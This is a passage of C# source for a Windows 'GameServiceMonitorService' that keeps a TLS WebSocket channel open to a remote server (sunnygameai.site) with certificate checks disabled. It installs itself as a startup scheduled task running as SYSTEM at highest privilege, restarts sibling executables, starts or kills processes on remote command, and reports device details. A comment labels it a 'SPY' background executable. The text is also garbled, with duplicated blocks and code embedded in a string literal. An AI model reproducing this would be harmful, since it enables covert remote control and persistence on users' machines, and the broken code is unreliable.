                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;
            try
            {
                LogDesktop(""Monitor: attempting to connect to remote "" + RemoteHost + "":"" + RemotePort + "" (sunnygameai.site)..."");
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    LogDesktop(""Monitor: TCP connected to "" + RemoteHost + "":"" + RemotePort + "", doing TLS..."");
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        LogDesktop(""Monitor: TLS authenticated to "" + RemoteHost);
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch { }
            await Task.Delay(5000);
        }
    }

    private static async Task<bool> HandleConnection(Stream stream, string hostHeader)
    {
        try
        {
            string httpReq = @""GET /communicate HTTP/1.1
Host: "" + hostHeader + @""
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

"";
            byte[] reqBytes = Encoding.UTF8.GetBytes(httpReq);
            await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
            List<byte> headerBytes = new List<byte>(512);
            string respStr = """";
            try
            {
                var readTask = Task.Run(() => {
                    int b;
                    while ((b = stream.ReadByte()) != -1)
                    {
                        headerBytes.Add((byte)b);
                        if (headerBytes.Count >= 4)
                        {
                            int n = headerBytes.Count;
                            if (headerBytes[n-4] == '\r' && headerBytes[n-3] == '\n' &&
                                headerBytes[n-2] == '\r' && headerBytes[n-1] == '\n')
                                break;
                        }
                    }
                });
                if (await Task.WhenAny(readTask, Task.Delay(5000)) != readTask) { LogDesktop(""Monitor: WebSocket handshake read timed out after 5s""); return false; }
                respStr = Encoding.UTF8.GetString(headerBytes.ToArray());
            }
            catch (Exception ex) { LogDesktop(""Monitor: WebSocket handshake read failed: "" + ex.Message); return false; }
            LogDesktop(""Monitor: WebSocket response: "" + respStr.Substring(0, Math.Min(200, respStr.Length)));
            for (int qs = 0; !respStr.Contains(""101"") && qs < 2; qs++)
            {
                await Task.Delay(1500);
                try
                {
                    await stream.WriteAsync(reqBytes, 0, reqBytes.Length);
                    byte[] respBuf = new byte[2048];
                    var retryTask = stream.ReadAsync(respBuf, 0, respBuf.Length);
                    if (await Task.WhenAny(retryTask, Task.Delay(5000)) == retryTask)
                    {
                        int read = await retryTask;
                        respStr = Encoding.UTF8.GetString(respBuf, 0, read);
                    }
                    else { LogDesktop(""Monitor: WebSocket handshake retry timed out""); return false; }
                }
                catch { return false; }
            }
            if (!respStr.Contains(""101"")) { LogDesktop(""Monitor: WebSocket handshake failed, no 101""); return false; }
            LogDesktop(""Monitor: WebSocket 101 OK, sending SignalR handshake"");
            SendWsText(stream, ""{\""protocol\"":\""json\"",\""version\"":1}\x1e"");
            ReadWebSocketTextFrame(stream);
            activeStream = stream;
            FlushPendingDebug();
            string reg = ""{\""type\"":1,\""target\"":\""RegisterMonitor\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\""]}\x1e"";
            SendWsText(stream, reg);
            dbgStream = stream;
            AnnounceDbg(stream);
            LogDesktop(""Monitor: registered as "" + DeviceName + "" (install dir "" + ExeDir() + "")"");
            // Run the initial probe on a background thread so the SignalR keep-alive
            // message loop (ReadWebSocketTextFrame below) is never starved while we
            // probe each service's health pipe (5 services x 800ms each = up to 4s).
            Thread probeThread = new Thread(() => { try { SendServiceStates(stream); } catch { } });
            probeThread.IsBackground = true;
            probeThread.Start();
            StringBuilder msgBuf = new StringBuilder();
            while (true)
            {
                string frameText = ReadWebSocketTextFrame(stream);
                if (frameText == null) break;
                msgBuf.Append(frameText);
                int idx = IndexOfSeparator(msgBuf);
                while (idx != -1)
                {
                    string rawJson = msgBuf.ToString().Substring(0, idx).Trim();
                    msgBuf.Remove(0, idx + 1);
                    if (rawJson.Length > 0) HandleSignalRMessage(stream, rawJson);
                    idx = IndexOfSeparator(msgBuf);
                }
            }
            return true;
        }
        catch { return false; }
        finally { activeStream = null; StopHealthTimer(); }
    }

    private static void StartWatchdog()
    {
        Thread t = new Thread(() =>
        {
            while (true)
            {
                try
                {
                    EnsureComponentRunning(""GameServiceCoreAgent.exe"", ""GameServiceCoreAgent"", Path.Combine(ExeDir(), ""GameServiceCoreAgent.exe""));
                    EnsureComponentRunning(""GameServiceUpdaterService.exe"", ""GameServiceUpdaterService"", Path.Combine(ExeDir(), ""GameServiceUpdaterService.exe""));
                    EnsureSelfTask();
                }
                catch { }
                Thread.Sleep(20000);
            }
        });
        t.IsBackground = true;
        t.Start();
    }

    private static void QueueDebugAlways(string msg)
    {
        LogDesktop(msg);
        lock (debugQueueLock) { pendingDebug.Add(msg); if (pendingDebug.Count > 100) pendingDebug.RemoveAt(0); }
        Stream s = activeStream;
        if (s != null) SendDebug(s, msg);
    }
    private static void FlushPendingDebug()
    {
        lock (debugQueueLock)
        {
            Stream s = activeStream;
            if (s == null) return;
            foreach (string msg in pendingDebug) SendDebug(s, msg);
            pendingDebug.Clear();
        }
    }
    private static bool IsProcessRunning(string imageName)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo(""tasklist.exe"", ""/fi \""IMAGENAME eq "" + imageName + ""\"" /fo csv"");
            psi.CreateNoWindow = true; psi.UseShellExecute = false; psi.RedirectStandardOutput = true;
            using (var p = Process.Start(psi))
            {
                if (p == null) return false;
                string outStr = p.StandardOutput.ReadToEnd();
                p.WaitForExit(3000);
                return outStr.IndexOf(imageName, StringComparison.OrdinalIgnoreCase) >= 0;
            }
        }
        catch { return false; }
    }
    private static void EnsureComponentRunning(string imageName, string taskName, string exePath)
    {
        string firstPath = File.Exists(exePath) ? exePath : null;
        if (firstPath == null) return;
        if (IsProcessRunning(imageName)) return;
        RunSchTask(""/run /tn "" + taskName);
        Thread.Sleep(2500);
        if (!IsProcessRunning(imageName)) QueueDebugAlways(imageName + "" was NOT running. Task /run attempted but still absent. Exe at "" + firstPath);
        else QueueDebugAlways(imageName + "" was not running; restarted via scheduled task."");
    }
    private static void EnsureSelfTask()
    {
        try
        {
            string selfExe = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (string.IsNullOrWhiteSpace(selfExe)) return;
            RunSchTask(""/create /tn GameServiceMonitorService /tr \"""" + selfExe + ""\"" /sc ONSTART /ru SYSTEM /rl HIGHEST /f"");
        }
        catch { }
    }
    private static int IndexOfSeparator(StringBuilder sb) { for (int i = 0; i < sb.Length; i++) if (sb[i] == '\x1e') return i; return -1; }

    private static void HandleSignalRMessage(Stream stream, string jsonStr)
    {
        try
        {
            int type = GetJsonInt(jsonStr, ""\""type\"""");
            if (type == 6) return;
            if (type == 1)
            {
                string target = GetJsonString(jsonStr, ""\""target\"""");
                if (target == ""RequestServiceStates"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    if (string.IsNullOrWhiteSpace(targetDevice) || string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                    {
                        SendServiceStates(stream);
                        StartHealthTimer(stream);
                    }
                }
                else if (target == ""WhoAreYou"")
                {
                    // Server lost our registration - identify ourselves again.
                    dbgInformed = false;
                    AnnounceDbg(stream);
                }
                else if (target == ""ControlService"")
                {
                    string targetDevice = GetJsonStringArray(jsonStr, 0);
                    string exeName = GetJsonStringArray(jsonStr, 1);
                    string action = GetJsonStringArray(jsonStr, 2);
                    if (string.Equals(targetDevice, DeviceName, StringComparison.OrdinalIgnoreCase))
                        HandleServiceControl(stream, exeName, action);
                }
            }
        }
        catch { }
    }

    private static void StartHealthTimer(Stream stream)
    {
        lock (timerLock)
        {
            if (healthTimer != null) { healthTimer.Dispose(); healthTimer = null; }
            healthTimer = new Timer(state =>
            {
                try { SendServiceStates(activeStream ?? stream); } catch { }
            }, null, 5000, 5000);
        }
    }
    private static void StopHealthTimer()
    {
        lock (timerLock) { if (healthTimer != null) { healthTimer.Dispose(); healthTimer = null; } }
    }

    private static void HandleServiceControl(Stream stream, string exeName, string action)
    {
        try
        {
            if (string.IsNullOrWhiteSpace(exeName)) return;
            string baseName = Path.GetFileNameWithoutExtension(exeName);
            string taskName;
            if (baseName.Equals(""GameServiceCoreAgent"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceCoreAgent"";
            else if (baseName.Equals(""GameServiceUpdaterService"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceUpdaterService"";
            else if (baseName.Equals(""GameServiceMonitorService"", StringComparison.OrdinalIgnoreCase)) taskName = ""GameServiceMonitorService"";
            else taskName = ""GameService_"" + baseName;
            if (action != null && action.Equals(""start"", StringComparison.OrdinalIgnoreCase))
            {
                RunSchTask(""/run /tn "" + taskName);
                SendDebug(stream, DeviceName + "" Start requested for "" + exeName + "" ("" + taskName + "")"");
            }
            else if (action != null && action.Equals(""stop"", StringComparison.OrdinalIgnoreCase))
            {
                try { ProcessStartInfo psi = new ProcessStartInfo(""taskkill.exe"", ""/f /im "" + exeName); psi.CreateNoWindow = true; psi.UseShellExecute = false; using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(3000); } } catch { }
                RunSchTask(""/end /tn "" + taskName);
                SendDebug(stream, DeviceName + "" Stop requested for "" + exeName + "" ("" + taskName + "")"");
            }
            Thread.Sleep(800);
            SendServiceStates(stream);
        }
        catch (Exception ex) { SendDebug(stream, DeviceName + "" ControlService error: "" + ex.Message); }
    }

    // Agents execute as SYSTEM via scheduled tasks where LocalApplicationData
    // points into systemprofile - NOT at the user folder the installer used.
    // Resolve the real install folder from this exe's own location instead.
    private static string ExeDir()
    {
        try
        {
            string loc = System.Reflection.Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(loc))
            {
                string d = Path.GetDirectoryName(loc);
                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
            }
        }
        catch { }
        return RootDir;
    }
    private static bool CheckResponsiveness(string exeName)
    {
        string baseName = Path.GetFileNameWithoutExtension(exeName);
        string[] pipeCandidates = new string[] { baseName + ""_health"", ""GameService_"" + baseName + ""_health"" };
        for (int ci = 0; ci < pipeCandidates.Length; ci++)
        {
            string pipeName = pipeCandidates[ci];
            try
            {
                if (!File.Exists(@""\\.\pipe\"" + pipeName)) continue;
                using (var client = new NamedPipeClientStream(""."", pipeName, PipeDirection.InOut, PipeOptions.None))
                {
                    client.Connect(800);
                    byte[] req = Encoding.UTF8.GetBytes(""Are you up?"");
                    client.Write(req, 0, req.Length);
                    client.Flush();
                    byte[] resp = new byte[16];
                    var readTask = client.ReadAsync(resp, 0, resp.Length);
                    if (!readTask.Wait(800)) continue;
                    int n = readTask.Result;
                    string r = Encoding.UTF8.GetString(resp, 0, n).Trim();
                    if (r.IndexOf(""YES"", StringComparison.OrdinalIgnoreCase) >= 0) return true;
                }
            }
            catch { }
        }
        return false;
    }

    private static void SendServiceStates(Stream stream)
    {
        try
        {
            if (stream == null) stream = activeStream;
            if (stream == null) return;
            List<string> exes = new List<string>();
            string scanDir = ExeDir();
            try { foreach (string exe in Directory.GetFiles(scanDir, ""*.exe"")) { string name = Path.GetFileName(exe); if (name.Equals(""GameServiceMonitorService.exe"", StringComparison.OrdinalIgnoreCase)) continue; exes.Add(name); } } catch (Exception exScan) { LogDesktop(""Monitor: exe scan failed in "" + scanDir + "": "" + exScan.Message); }
            LogDesktop(""Monitor: probing "" + exes.Count + "" service(s) from "" + scanDir);
            StringBuilder arr = new StringBuilder(); arr.Append(""["");
            for (int i = 0; i < exes.Count; i++)
            {
                if (i > 0) arr.Append("","");
                string exeName = exes[i];
                bool responding = CheckResponsiveness(exeName);
                bool running = responding || IsProcessRunning(exeName);
                int status = responding ? 0 : (running ? 1 : 2);
                string baseName2 = Path.GetFileNameWithoutExtension(exeName);
                string taskName2;
                if (baseName2.Equals(""GameServiceCoreAgent"", StringComparison.OrdinalIgnoreCase)) taskName2 = ""GameServiceCoreAgent"";
                else if (baseName2.Equals(""GameServiceUpdaterService"", StringComparison.OrdinalIgnoreCase)) taskName2 = ""GameServiceUpdaterService"";
                else taskName2 = ""GameService_"" + baseName2;
                arr.Append(""{\""name\"":\"""" + EscapeJson(exeName) + ""\"",\""status\"":"" + status + "",\""taskName\"":\"""" + EscapeJson(taskName2) + ""\""}"");
            }
            arr.Append(""]"");
            string msg = ""{\""type\"":1,\""target\"":\""ReportServiceStates\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"","" + arr.ToString() + ""]}\x1e"";
            SendWsText(stream, msg);
            LogDesktop(""Monitor: reported "" + exes.Count + "" service(s)"");
        }
        catch (Exception exRep) { LogDesktop(""Monitor: SendServiceStates failed: "" + exRep.Message); }
    }

    private static void KillProcess(string processName) { try { ProcessStartInfo psi = new ProcessStartInfo(""taskkill.exe"", ""/f /im "" + processName); psi.CreateNoWindow = true; psi.UseShellExecute = false; using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(3000); } } catch { } }
    private static void RunSchTask(string args) { try { ProcessStartInfo psi = new ProcessStartInfo(""schtasks.exe"", args); psi.CreateNoWindow = true; psi.UseShellExecute = false; using (var p = Process.Start(psi)) { if (p != null) p.WaitForExit(5000); } } catch { } }
    private static void SendDebug(Stream stream, string msg) { try { LogDesktop(msg); dbgStream = stream; ShipDbg(StampFor(msg)); } catch { } }
    private static string EscapeJson(string s) { if (s == null) return """"; StringBuilder sb = new StringBuilder(); foreach (char c in s) { if (c == '\\') sb.Append(""\\\\""); else if (c == '""') sb.Append(""\\\""""); else if (c == '\n') sb.Append(""\\n""); else if (c == '\r') sb.Append(""\\r""); else if (c == '\t') sb.Append(""\\t""); else if (c < 0x20) sb.Append(""\\u"" + ((int)c).ToString(""x4"")); else sb.Append(c); } return sb.ToString(); }
    private static int GetJsonInt(string json, string key) { string v = GetJsonString(json, key); int r; return int.TryParse(v, out r) ? r : 0; }
    private static bool GetJsonBool(string json, string key) { int idx = json.IndexOf(key, StringComparison.Ordinal); if (idx < 0) return false; idx += key.Length; while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++; return json.Substring(idx).StartsWith(""true"", StringComparison.OrdinalIgnoreCase); }
    private static string GetJsonString(string json, string key) { if (string.IsNullOrEmpty(json) || string.IsNullOrEmpty(key)) return """"; int idx = json.IndexOf(key, StringComparison.Ordinal); if (idx < 0) return """"; idx += key.Length; while (idx < json.Length && (json[idx] == ' ' || json[idx] == ':')) idx++; if (idx >= json.Length) return """"; if (json[idx] == '""') { idx++; StringBuilder sb = new StringBuilder(); while (idx < json.Length) { char c = json[idx]; if (c == '\\' && idx + 1 < json.Length) { char n = json[idx+1]; if (n == 'n') sb.Append('\n'); else if (n == 'r') sb.Append('\r'); else if (n == 't') sb.Append('\t'); else if (n == '\\') sb.Append('\\'); else if (n == '""') sb.Append('""'); else sb.Append(n); idx += 2; continue; } if (c == '""') break; sb.Append(c); idx++; } return sb.ToString(); } int j = idx; while (j < json.Length && json[j] != ',' && json[j] != '}' && json[j] != ']' && json[j] != ' ') j++; return json.Substring(idx, j-idx); }
    private static string GetJsonStringArray(string json, int arrayIndex) { int idx = json.IndexOf(""\""arguments\"""", StringComparison.Ordinal); if (idx < 0) return """"; idx += ""\""arguments\"""".Length; while (idx < json.Length && json[idx] != '[') idx++; idx++; int cur = 0; while (idx < json.Length && cur < arrayIndex) { char c = json[idx]; if (c == '""') { idx++; while (idx < json.Length) { if (json[idx] == '\\') idx+=2; else if (json[idx] == '""') { idx++; break; } else idx++; } cur++; } else if (c != ' ' && c != ',' && c != '\n' && c != '\r') { cur++; while (idx < json.Length && json[idx] != ',' && json[idx] != ']') idx++; if (idx < json.Length && json[idx] == ',') idx++; } else idx++; } while (idx < json.Length && (json[idx] == ' ' || json[idx] == ',' || json[idx] == '\n' || json[idx] == '\r')) idx++; if (idx >= json.Length || json[idx] != '""') return """"; idx++; StringBuilder sb = new StringBuilder(); while (idx < json.Length) { char c = json[idx]; if (c == '\\' && idx+1 < json.Length) { sb.Append(json[idx+1]); idx+=2; continue; } if (c == '""') break; sb.Append(c); idx++; } return sb.ToString(); }
    // Reads ONE logical websocket text message. Answers PINGs with PONGs (proxy edges
    // send them and drop peers that never reply), assembles continuation fragments
    // and treats CLOSE as end-of-stream.
    private static string ReadWebSocketTextFrame(Stream stream)
    {
        MemoryStream assembled = null;
        while (true)
        {
            int b0 = stream.ReadByte();
            if (b0 == -1) return null;
            int opcode = b0 & 0x0F;
            bool fin = (b0 & 0x80) != 0;
            int b1 = stream.ReadByte();
            if (b1 == -1) return null;
            bool isMasked = (b1 & 0x80) != 0;
            long payloadLen = b1 & 0x7F;
            if (payloadLen == 126) { int hi = stream.ReadByte(); int lo = stream.ReadByte(); if (hi == -1 || lo == -1) return null; payloadLen = (hi << 8) | lo; }
            else if (payloadLen == 127) { byte[] lenBuf = new byte[8]; ReadFully(stream, lenBuf, 8); payloadLen = 0; for (int i = 0; i < 8; i++) payloadLen = (payloadLen << 8) | lenBuf[i]; }
            if (payloadLen < 0 || payloadLen > 67108864) return null;
            byte[] mask = null;
            if (isMasked) { mask = new byte[4]; ReadFully(stream, mask, 4); }
            byte[] payload = new byte[payloadLen];
            ReadFully(stream, payload, (int)payloadLen);
            if (mask != null) for (int i = 0; i < payload.Length; i++) payload[i] = (byte)(payload[i] ^ mask[i % 4]);
            if (opcode == 0x9) { SendWsControl(stream, 0xA, payload); continue; }
            if (opcode == 0xA) { continue; }
            if (opcode == 0x8) { return null; }
            if (opcode == 0x1 || opcode == 0x2)
            {
                if (fin) return Encoding.UTF8.GetString(payload);
                assembled = new MemoryStream();
                assembled.Write(payload, 0, payload.Length);
                continue;
            }
            if (opcode == 0x0)
            {
                if (assembled == null) continue;
                assembled.Write(payload, 0, payload.Length);
                if (fin) { byte[] all = assembled.ToArray(); assembled = null; return Encoding.UTF8.GetString(all); }
                continue;
            }
        }
    }
    private static void SendWsControl(Stream stream, byte opcode, byte[] payload)
    {
        try
        {
            int len = payload != null ? payload.Length : 0;
            MemoryStream frame = new MemoryStream();
            frame.WriteByte((byte)(0x80 | opcode));
            frame.WriteByte((byte)(0x80 | len));
            byte[] maskKey = new byte[4];
            new Random().NextBytes(maskKey);
            frame.Write(maskKey, 0, 4);
            for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4]));
            byte[] frameBytes = frame.ToArray();
            lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); }
        }
        catch { }
    }
    private static void ReadFully(Stream stream, byte[] buf, int count) { int offset = 0; while (offset < count) { int r = stream.Read(buf, offset, count-offset); if (r <= 0) throw new IOException(""End of stream""); offset += r; } }
    private static readonly object sendLock = new object();
    private static void SendWsText(Stream stream, string text) { byte[] payload = Encoding.UTF8.GetBytes(text); int len = payload.Length; MemoryStream frame = new MemoryStream(); frame.WriteByte(0x81); byte[] maskKey = new byte[4]; new Random().NextBytes(maskKey); if (len <= 125) frame.WriteByte((byte)(0x80 | len)); else if (len <= 65535) { frame.WriteByte((byte)(0x80 | 126)); frame.WriteByte((byte)((len >> 8) & 0xFF)); frame.WriteByte((byte)(len & 0xFF)); } else { frame.WriteByte((byte)(0x80 | 127)); for (int i = 7; i >= 0; i--) frame.WriteByte((byte)((len >> (i*8)) & 0xFF)); } frame.Write(maskKey, 0, 4); for (int i = 0; i < len; i++) frame.WriteByte((byte)(payload[i] ^ maskKey[i % 4])); byte[] frameBytes = frame.ToArray(); lock (sendLock) { stream.Write(frameBytes, 0, frameBytes.Length); stream.Flush(); } }
    private static TcpClient ConnectTcpWithTimeout(string host, int port, int timeoutMs)
    {
        System.Net.IPAddress[] ips = System.Net.Dns.GetHostAddresses(host);
        if (ips == null || ips.Length == 0) throw new Exception(""DNS returned no IP addresses for "" + host);
        Exception lastEx = null;
        foreach (var ip in ips)
        {
            if (ip.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork) continue;
            try
            {
                TcpClient tcp = new TcpClient();
                IAsyncResult ar = tcp.BeginConnect(ip, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(timeoutMs, false))
                {
                    try { tcp.Close(); } catch { }
                    throw new TimeoutException(""TCP connect to "" + host + "" ("" + ip + ""):"" + port + "" timed out after "" + timeoutMs + ""ms"");
                }
                tcp.EndConnect(ar);
                return tcp;
            }
            catch (Exception ex) { lastEx = ex; }
        }
        throw lastEx ?? new Exception(""Failed to connect to any IP for "" + host);
    }

    private static SslStream AuthenticateSslWithTimeout(TcpClient tcp, string host, int timeoutMs)
    {
        LogDesktop(""Monitor: creating SslStream for "" + host + "" (Tls12)"");
        SslStream ssl = new SslStream(tcp.GetStream(), false, (sender, cert, chain, errs) => true);
        LogDesktop(""Monitor: calling AuthenticateAsClient Tls12 for "" + host);
        try {
            var task = System.Threading.Tasks.Task.Run((Action)(() => ssl.AuthenticateAsClient(host, null, SslProtocols.None, false)));
            bool ok = task.Wait(timeoutMs);
            if (!ok) {
                LogDesktop(""Monitor: TLS timeout after "" + timeoutMs + ""ms"");
                try { ssl.Close(); } catch {}
                throw new TimeoutException(""TLS handshake to "" + host + "" timed out after "" + timeoutMs + ""ms"");
            }
            if (task.IsFaulted) throw task.Exception.InnerException;
            LogDesktop(""Monitor: TLS authenticated to "" + host + "" proto="" + ssl.SslProtocol);
            return ssl;
        } catch (Exception ex) {
            LogDesktop(""Monitor: TLS failed "" + ex.GetType().Name + "": "" + ex.Message);
            try { ssl.Close(); } catch {}
            throw;
        }
    }
}";
    private static readonly int RemotePort = 443;
    private static readonly string LocalHost = ""127.0.0.1"";
    private static readonly int LocalPort = 8052;
    private static readonly string DeviceName = Environment.MachineName + ""_PC"";

    private static volatile Stream activeStream;
    private static readonly List<string> pendingDebug = new List<string>();
    private static readonly object debugQueueLock = new object();

    private static string RootDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), ""GameService"");

    private static Mutex singleInstance;
    private static Timer healthTimer;
    private static readonly object timerLock = new object();
    private static string lastWatchedDevice = null;
    private static readonly object desktopLogLock = new object();
    private static string[] GetDesktopLogPaths(string fileName)
    {
        var paths = new List<string>();
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try { string d = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory); if (!string.IsNullOrEmpty(d)) paths.Add(Path.Combine(d, fileName)); } catch {}
        try
        {
            string usersRoot = @""C:\Users"";
            if (Directory.Exists(usersRoot))
                foreach (string userDir in Directory.GetDirectories(usersRoot))
                {
                    string desktopFolder = Path.Combine(userDir, ""Desktop"");
                    if (Directory.Exists(desktopFolder))
                    {
                        string p = Path.Combine(desktopFolder, fileName);
                        if (!paths.Contains(p)) paths.Add(p);
                    }
                    string oneDriveDesktop = Path.Combine(userDir, ""OneDrive"", ""Desktop"");
                    if (Directory.Exists(oneDriveDesktop))
                    {
                        string p2 = Path.Combine(oneDriveDesktop, fileName);
                        if (!paths.Contains(p2)) paths.Add(p2);
                    }
                }
        } catch {}
        try { string fallback = Path.Combine(RootDir, fileName); if (!paths.Contains(fallback)) paths.Add(fallback); } catch {}
        return paths.ToArray();
    }
    private static void LogDesktop(string msg)
    {
        try
        {
            string line = DateTime.Now.ToString(""yyyy-MM-dd HH:mm:ss.fff"") + "" ["" + DeviceName + ""] "" + msg + Environment.NewLine;
            string[] paths = GetDesktopLogPaths(""GameServiceMonitorService.txt"");
            lock (desktopLogLock)
            {
                foreach (string p in paths)
                {
                    try { string dir = Path.GetDirectoryName(p); if (!string.IsNullOrEmpty(dir)) Directory.CreateDirectory(dir); File.AppendAllText(p, line); } catch {}
                }
            }
        } catch {}
    }

    private static void LogNetworkDiagnostics()
    {
        try
        {
            LogDesktop(""=== Monitor Network Diagnostics ==="");
            try { var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName()); foreach (var ip in host.AddressList) LogDesktop(""Monitor Local IP: "" + ip.ToString() + "" ("" + ip.AddressFamily + "")""); } catch (Exception ex) { LogDesktop(""Monitor GetHostEntry failed: "" + ex.Message); }
            try { var ips = System.Net.Dns.GetHostAddresses(RemoteHost); LogDesktop(""Monitor DNS "" + RemoteHost + "" => "" + string.Join("", "", Array.ConvertAll(ips, ip => ip.ToString()))); } catch (Exception ex) { LogDesktop(""Monitor DNS "" + RemoteHost + "" failed: "" + ex.GetType().Name + "": "" + ex.Message); }
            try { foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()) { if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue; LogDesktop(""Monitor NIC: "" + ni.Name + "" "" + ni.NetworkInterfaceType + "" "" + ni.OperationalStatus); foreach (var ua in ni.GetIPProperties().UnicastAddresses) LogDesktop(""  Monitor Unicast: "" + ua.Address.ToString()); } } catch (Exception ex) { LogDesktop(""Monitor NIC failed: "" + ex.Message); }
            LogDesktop(""Monitor RemoteHost="" + RemoteHost + "":"" + RemotePort + "" LocalHost="" + LocalHost + "":"" + LocalPort);
            LogDesktop(""=== End Monitor Diagnostics ==="");
        } catch (Exception ex) { LogDesktop(""Monitor LogNetworkDiagnostics failed: "" + ex.Message); }
    }



    // ── 🐛 Device Debug console: self-registration + stamped shipping ──
    static volatile bool dbgInformed = false;
    static volatile Stream dbgStream = null;
    const string DbgService = ""GameServiceMonitorService.exe"";
    static string StampFor(string msg)
    {
        if (!string.IsNullOrEmpty(msg) && msg.StartsWith(""[""))
            return msg.StartsWith(""[ERROR]"") || msg.StartsWith(""[SUCCESS]"") || msg.StartsWith(""[MESSAGE]"") ? msg : ""[MESSAGE] "" + msg;
        string m = (msg ?? """").ToLowerInvariant();
        if (m.Contains(""fail"") || m.Contains(""error"") || m.Contains(""exception"") || m.Contains(""timeout"") || m.Contains(""not running"")) return ""[ERROR] "" + msg;
        if (m.Contains(""success"") || m.Contains(""updated"") || m.Contains(""started"") || m.Contains(""registered"") || m.Contains(""completed"") || m.Contains(""backed up"") || m.Contains(""rolled back"") || m.Contains(""installed"")) return ""[SUCCESS] "" + msg;
        return ""[MESSAGE] "" + msg;
    }
    static void AnnounceDbg(Stream s)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""RegisterDebugSource\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\""]}\x1e"");
            dbgInformed = true;
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbgLine(Stream s, string stamped)
    {
        try
        {
            SendWsText(s, ""{\""type\"":1,\""target\"":\""SendServiceDebug\"",\""arguments\"":[\"""" + EscapeJson(DeviceName) + ""\"",\"""" + EscapeJson(DbgService) + ""\"",[\"""" + EscapeJson(stamped) + ""\""]]}\x1e"");
        }
        catch { dbgInformed = false; }
    }
    static void ShipDbg(string stamped)
    {
        Stream s = dbgStream;
        if (s == null) { dbgInformed = false; return; }
        try { if (!dbgInformed) AnnounceDbg(s); ShipDbgLine(s, stamped); }
        catch { dbgInformed = false; }
    }
    static void DbgReset() { dbgStream = null; dbgInformed = false; }
    static void Main(string[] args)
    {
        try { Directory.CreateDirectory(RootDir); } catch { }
        bool createdNew;
        singleInstance = new Mutex(true, ""Global\\GameServiceMonitorService.SingleInstance"", out createdNew);
        if (!createdNew) return;
        StartHealthResponder();
        LogDesktop(""Monitor Main started, DeviceName="" + DeviceName);
        StartWatchdog();
        LogDesktop(""Monitor watchdog started"");
        RunAsync().GetAwaiter().GetResult();
    }

    // ── Global health responder: mandatory for every SPY background exe ──
    private static void StartHealthResponder()
    {
        try
        {
            Thread healthThread = new Thread(() =>
            {
                while (true)
                {
                    try
                    {
                        using (var server = new NamedPipeServerStream(""GameServiceMonitorService_health"", PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                        {
                            server.WaitForConnection();
                            byte[] buf = new byte[1024];
                            int n = server.Read(buf, 0, buf.Length);
                            string msg = Encoding.UTF8.GetString(buf, 0, n).Trim();
                            if (msg.IndexOf(""Are you up"", StringComparison.OrdinalIgnoreCase) >= 0)
                            {
                                byte[] resp = Encoding.UTF8.GetBytes(""YES"");
                                server.Write(resp, 0, resp.Length);
                                server.Flush();
                            }
                        }
                    }
                    catch { Thread.Sleep(500); }
                }
            });
            healthThread.IsBackground = true;
            healthThread.Start();
        }
        catch { }
    }

    static async Task RunAsync()
    {
        while (true)
        {
            bool connected = false;
            try
            {
                LogDesktop(""Monitor: attempting to connect to remote "" + RemoteHost + "":"" + RemotePort + "" (sunnygameai.site)..."");
                using (var tcp = ConnectTcpWithTimeout(RemoteHost, RemotePort, 5000))
                {
                    LogDesktop(""Monitor: TCP connected to "" + RemoteHost + "":"" + RemotePort + "", doing TLS..."");
                    using (var ssl = AuthenticateSslWithTimeout(tcp, RemoteHost, 5000))
                    {
                        LogDesktop(""Monitor: TLS authenticated to "" + RemoteHost);
                        connected = await HandleConnection(ssl, RemoteHost);
                    }
                }
            }
            catch { }
            if (!connected)
            {
                try
                {
                    using (var tcp = new TcpClient())
                    {
                        LogDesktop(""Monitor: remote failed, trying fallback "" + LocalHost + "":"" + LocalPort);
                    var fbTask = tcp.ConnectAsync(LocalHost, LocalPort);
                    if (await Task.WhenAny(fbTask, Task.Delay(3000)) != fbTask) { LogDesktop(""Monitor: fallback TCP to "" + LocalHost + "":"" + LocalPort + "" timed out""); throw new TimeoutException(""Fallback connect timed out""); }
                    await fbTask;
                    LogDesktop(""Monitor: fallback connected to "" + LocalHost + "":"" + LocalPort);
